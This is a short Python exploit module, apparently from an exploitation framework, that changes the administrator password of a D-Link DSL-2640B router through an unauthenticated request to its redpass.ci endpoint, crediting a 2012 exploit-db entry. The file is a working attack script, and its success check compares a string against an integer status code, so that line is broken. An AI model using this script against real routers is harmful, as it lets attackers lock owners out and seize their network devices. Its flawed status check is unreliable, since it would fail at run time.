from requests import get

from lib.interfaces.iexploit import IExploit


class Exploit(IExploit):
    def __init__(self):
        super(Exploit, self).__init__(
            name = "Unauthenticated Remote Password Change",
            category = "csrf",
            authors = "Ivano Binetti",
            date = "19/02/2012",
            cwe = "CWE-352: Cross-Site Request Forgery (CSRF)",
            description = "The D-Link DSL-2640B's web interface (listening on tcp/ip port 80) is prone to CSRF vulnerabilities which allows to change router parameters and -among other things- to change default administrator(\'admin\') password.",
            references = "https://www.exploit-db.com/exploits/36105/"
        )

    def default (self):
        data = {"password": "1234"}

        return data

    def run(self, data):
        password = data["password"]

        if password:
            r = get("http://{0}:80/redpass.ci?sysPassword={1}&change=1".format(self.getIP(), password))

            if "200" in r.status_code:
                message = "Password change successfully"
            else:
                message = "Error"

            return message
        else:
            return "Error"

